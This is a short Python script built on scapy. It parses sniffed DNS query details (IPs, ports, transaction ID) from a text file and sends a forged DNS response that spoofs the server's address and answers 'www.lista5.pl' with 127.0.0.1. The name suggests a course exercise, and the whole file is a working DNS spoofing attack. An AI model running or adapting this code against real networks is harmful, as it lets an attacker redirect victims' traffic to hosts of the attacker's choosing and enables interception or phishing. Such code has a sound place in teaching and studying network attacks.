import os
import re
from scapy.all import *

fileName = "dane"

f = open(fileName, "r")
fileContent = f.read()

m = re.search('(?<=Source: )([0-9.]+)', fileContent)
while not m:
	f = open(fileName, "r")
	fileContent = f.read()
	m = re.search('(?<=Source: )([0-9.]+)', fileContent)
srcIP = m.group(0)

m = re.search('(?<=Destination: )([0-9.]+)', fileContent)
dstIP = m.group(0)

m = re.search('(?<=Source Port: )([0-9]+)', fileContent)
srcPort = m.group(0)

m = re.search('(?<=Destination Port: )([0-9]+)', fileContent)
dstPort = m.group(0)

m = re.search('(?<=Transaction ID: )([0-9a-x]+)', fileContent)
transID = m.group(0)

a = IP(dst=srcIP, src=dstIP)/UDP(dport=int(srcPort),sport=int(dstPort))/DNS(id=int(transID, 16),qr=0,an=DNSRR(rrname="www.lista5.pl", type='A', ttl=10,rdata='127.0.0.1'))
send(a)

os.remove(fileName)
